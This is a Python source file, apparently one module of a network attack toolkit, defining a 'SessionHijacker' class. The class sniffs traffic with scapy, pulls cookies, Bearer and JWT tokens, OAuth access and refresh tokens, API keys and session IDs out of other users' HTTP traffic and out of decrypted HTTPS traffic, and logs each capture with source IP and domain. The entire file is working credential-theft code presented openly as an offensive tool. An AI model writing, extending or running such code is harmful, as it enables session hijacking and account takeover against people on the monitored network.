"""
Session Hijacker Module
───────────────────────
Captures session tokens from network traffic:
  - HTTP Set-Cookie headers
  - Authorization: Bearer tokens
  - JWT tokens (eyJ pattern)
  - OAuth tokens (access_token, refresh_token)
  - API keys (X-API-Key headers)
  - Stores captured sessions with metadata (source IP, domain, timestamp, token type)
"""

import re
import time
import json
import base64
import threading
from collections import defaultdict

from scapy.all import IP, TCP, Raw, sniff

from .config import log


class SessionHijacker:
    """
    Session token capture engine.
    Sniffs HTTP/HTTPS traffic and extracts session cookies, JWTs,
    OAuth tokens, Bearer tokens, and API keys.

    Works standalone on HTTP traffic or in conjunction with HTTPSInterceptor
    for decrypted HTTPS traffic.
    """

    def __init__(self, interface, https_interceptor=None):
        self.interface = interface
        self._https_interceptor = https_interceptor
        self._running = False
        self._thread = None
        self._sessions = []
        self._lock = threading.Lock()
        self._seen_tokens = set()  # Deduplication

        # Compile extraction patterns
        self._patterns = self._compile_patterns()

    def _compile_patterns(self):
        """Compile regex patterns for session/token extraction."""
        return {
            "set_cookie": re.compile(
                r'Set-Cookie:\s*([^\r\n]+)', re.I
            ),
            "cookie": re.compile(
                r'Cookie:\s*([^\r\n]+)', re.I
            ),
            "bearer": re.compile(
                r'Authorization:\s*Bearer\s+([A-Za-z0-9\-._~+/]+=*)', re.I
            ),
            "jwt": re.compile(
                r'(eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+)'
            ),
            "oauth_access": re.compile(
                r'["\']?access_token["\']?\s*[:=]\s*["\']?([A-Za-z0-9\-._~+/]+=*)["\']?', re.I
            ),
            "oauth_refresh": re.compile(
                r'["\']?refresh_token["\']?\s*[:=]\s*["\']?([A-Za-z0-9\-._~+/]+=*)["\']?', re.I
            ),
            "api_key_header": re.compile(
                r'X-API-Key:\s*([^\r\n\s]+)', re.I
            ),
            "authorization_key": re.compile(
                r'Authorization:\s*(?:Token|ApiKey|Api-Key)\s+([^\r\n\s]+)', re.I
            ),
            "session_id": re.compile(
                r'(?:session_id|sessionid|PHPSESSID|JSESSIONID|ASP\.NET_SessionId|_session)\s*=\s*([^;\s&"\']+)',
                re.I
            ),
            "csrf_token": re.compile(
                r'(?:csrf_token|_csrf|csrfmiddlewaretoken|__RequestVerificationToken)\s*=\s*([^;\s&"\']+)',
                re.I
            ),
        }

    def _decode_jwt(self, token):
        """Decode JWT payload (without verification) for metadata extraction."""
        try:
            parts = token.split(".")
            if len(parts) != 3:
                return None
            # Decode payload (part 2)
            payload_b64 = parts[1]
            # Add padding
            padding = 4 - len(payload_b64) % 4
            if padding != 4:
                payload_b64 += "=" * padding
            payload_bytes = base64.urlsafe_b64decode(payload_b64)
            return json.loads(payload_bytes)
        except (ValueError, json.JSONDecodeError, Exception):
            return None

    def _extract_host(self, payload_str):
        """Extract Host header from HTTP payload."""
        match = re.search(r'Host:\s*([^\r\n]+)', payload_str, re.I)
        if match:
            return match.group(1).strip()
        return "unknown"

    def _extract_url(self, payload_str):
        """Extract request URL from HTTP payload."""
        match = re.match(r'(GET|POST|PUT|DELETE|PATCH)\s+(\S+)', payload_str)
        if match:
            return match.group(2)
        return "/"

    def _packet_handler(self, pkt):
        """Process packets for session token extraction."""
        if not pkt.haslayer(TCP) or not pkt.haslayer(Raw):
            return

        tcp = pkt[TCP]
        # Only look at HTTP traffic (port 80, 8080, or high ports for APIs)
        if not (tcp.dport in (80, 8080, 8443, 3000, 5000, 8000) or
                tcp.sport in (80, 8080, 8443, 3000, 5000, 8000)):
            return

        try:
            payload = bytes(pkt[Raw].load)
            payload_str = payload.decode(errors='ignore')
        except Exception:
            return

        src_ip = pkt[IP].src if pkt.haslayer(IP) else "unknown"
        dst_ip = pkt[IP].dst if pkt.haslayer(IP) else "unknown"
        host = self._extract_host(payload_str)

        self._extract_tokens(payload_str, src_ip, dst_ip, host)

    def _extract_tokens(self, payload_str, src_ip, dst_ip, host):
        """Extract all types of session tokens from a payload string."""
        # Set-Cookie headers
        for match in self._patterns["set_cookie"].finditer(payload_str):
            cookie_val = match.group(1).strip()
            token_key = f"set_cookie:{host}:{cookie_val[:64]}"
            if token_key not in self._seen_tokens:
                self._seen_tokens.add(token_key)
                self._add_session({
                    "type": "cookie",
                    "subtype": "set_cookie",
                    "value": cookie_val,
                    "domain": host,
                    "src_ip": src_ip,
                    "dst_ip": dst_ip,
                })

        # Cookie headers (request)
        for match in self._patterns["cookie"].finditer(payload_str):
            cookie_val = match.group(1).strip()
            token_key = f"cookie:{host}:{cookie_val[:64]}"
            if token_key not in self._seen_tokens:
                self._seen_tokens.add(token_key)
                self._add_session({
                    "type": "cookie",
                    "subtype": "request_cookie",
                    "value": cookie_val,
                    "domain": host,
                    "src_ip": src_ip,
                    "dst_ip": dst_ip,
                })

        # Bearer tokens
        for match in self._patterns["bearer"].finditer(payload_str):
            token_val = match.group(1)
            token_key = f"bearer:{token_val[:32]}"
            if token_key not in self._seen_tokens:
                self._seen_tokens.add(token_key)
                session_info = {
                    "type": "bearer_token",
                    "value": token_val,
                    "domain": host,
                    "src_ip": src_ip,
                    "dst_ip": dst_ip,
                }
                # Check if it is a JWT
                jwt_payload = self._decode_jwt(token_val)
                if jwt_payload:
                    session_info["jwt_claims"] = jwt_payload
                    session_info["subtype"] = "jwt"
                else:
                    session_info["subtype"] = "opaque"
                self._add_session(session_info)

        # Standalone JWT tokens (in body, URL params, etc.)
        for match in self._patterns["jwt"].finditer(payload_str):
            token_val = match.group(1)
            token_key = f"jwt:{token_val[:32]}"
            if token_key not in self._seen_tokens:
                self._seen_tokens.add(token_key)
                jwt_payload = self._decode_jwt(token_val)
                self._add_session({
                    "type": "jwt",
                    "value": token_val,
                    "domain": host,
                    "src_ip": src_ip,
                    "dst_ip": dst_ip,
                    "jwt_claims": jwt_payload,
                })

        # OAuth access tokens
        for match in self._patterns["oauth_access"].finditer(payload_str):
            token_val = match.group(1)
            token_key = f"oauth_access:{token_val[:32]}"
            if token_key not in self._seen_tokens:
                self._seen_tokens.add(token_key)
                self._add_session({
                    "type": "oauth",
                    "subtype": "access_token",
                    "value": token_val,
                    "domain": host,
                    "src_ip": src_ip,
                    "dst_ip": dst_ip,
                })

        # OAuth refresh tokens
        for match in self._patterns["oauth_refresh"].finditer(payload_str):
            token_val = match.group(1)
            token_key = f"oauth_refresh:{token_val[:32]}"
            if token_key not in self._seen_tokens:
                self._seen_tokens.add(token_key)
                self._add_session({
                    "type": "oauth",
                    "subtype": "refresh_token",
                    "value": token_val,
                    "domain": host,
                    "src_ip": src_ip,
                    "dst_ip": dst_ip,
                })

        # API Key headers
        for match in self._patterns["api_key_header"].finditer(payload_str):
            key_val = match.group(1)
            token_key = f"api_key:{key_val[:32]}"
            if token_key not in self._seen_tokens:
                self._seen_tokens.add(token_key)
                self._add_session({
                    "type": "api_key",
                    "subtype": "x_api_key",
                    "value": key_val,
                    "domain": host,
                    "src_ip": src_ip,
                    "dst_ip": dst_ip,
                })

        # Authorization Token/ApiKey headers
        for match in self._patterns["authorization_key"].finditer(payload_str):
            key_val = match.group(1)
            token_key = f"auth_key:{key_val[:32]}"
            if token_key not in self._seen_tokens:
                self._seen_tokens.add(token_key)
                self._add_session({
                    "type": "api_key",
                    "subtype": "authorization_header",
                    "value": key_val,
                    "domain": host,
                    "src_ip": src_ip,
                    "dst_ip": dst_ip,
                })

        # Session IDs in cookies/URLs
        for match in self._patterns["session_id"].finditer(payload_str):
            session_val = match.group(1)
            token_key = f"session_id:{host}:{session_val[:32]}"
            if token_key not in self._seen_tokens:
                self._seen_tokens.add(token_key)
                self._add_session({
                    "type": "session_id",
                    "value": session_val,
                    "domain": host,
                    "src_ip": src_ip,
                    "dst_ip": dst_ip,
                })

    def _add_session(self, session_info):
        """Add a captured session with timestamp."""
        session_info["timestamp"] = time.time()
        with self._lock:
            self._sessions.append(session_info)
        log.critical(
            f"SESSION CAPTURED: [{session_info['type']}] "
            f"from {session_info['src_ip']} -> {session_info.get('domain', 'unknown')} "
            f"({session_info.get('subtype', '')})"
        )

    def _sniff_loop(self):
        """Background sniffing thread."""
        try:
            sniff(
                iface=self.interface,
                prn=self._packet_handler,
                store=False,
                stop_filter=lambda x: not self._running
            )
        except Exception as e:
            log.error(f"Session hijacker sniff error: {e}")

    def process_payload(self, payload_str, src_ip="intercepted", dst_ip="upstream", host="unknown"):
        """
        Process a decrypted payload externally (e.g., from HTTPSInterceptor).
        Can be called directly to analyze already-decrypted traffic.
        """
        self._extract_tokens(payload_str, src_ip, dst_ip, host)

    def start(self):
        """Start session hijacking."""
        if self._running:
            log.warning("Session hijacker already running")
            return False

        self._running = True
        self._thread = threading.Thread(target=self._sniff_loop, daemon=True)
        self._thread.start()
        log.info(f"Session hijacker started on {self.interface}")
        return True

    def stop(self):
        """Stop session hijacking."""
        self._running = False
        if self._thread:
            self._thread.join(timeout=5)
        log.info(f"Session hijacker stopped. Captured {len(self._sessions)} sessions")

    def get_sessions(self):
        """Return all captured sessions."""
        with self._lock:
            return list(self._sessions)

    def get_sessions_by_type(self, token_type):
        """Return sessions filtered by type (cookie, jwt, bearer_token, oauth, api_key)."""
        with self._lock:
            return [s for s in self._sessions if s["type"] == token_type]

    def get_sessions_by_domain(self, domain):
        """Return sessions filtered by domain."""
        with self._lock:
            return [s for s in self._sessions if domain in s.get("domain", "")]

    def get_stats(self):
        """Return session capture statistics."""
        with self._lock:
            by_type = defaultdict(int)
            by_domain = defaultdict(int)
            for s in self._sessions:
                by_type[s["type"]] += 1
                by_domain[s.get("domain", "unknown")] += 1

            return {
                "running": self._running,
                "total_sessions": len(self._sessions),
                "unique_tokens": len(self._seen_tokens),
                "by_type": dict(by_type),
                "by_domain": dict(by_domain),
            }
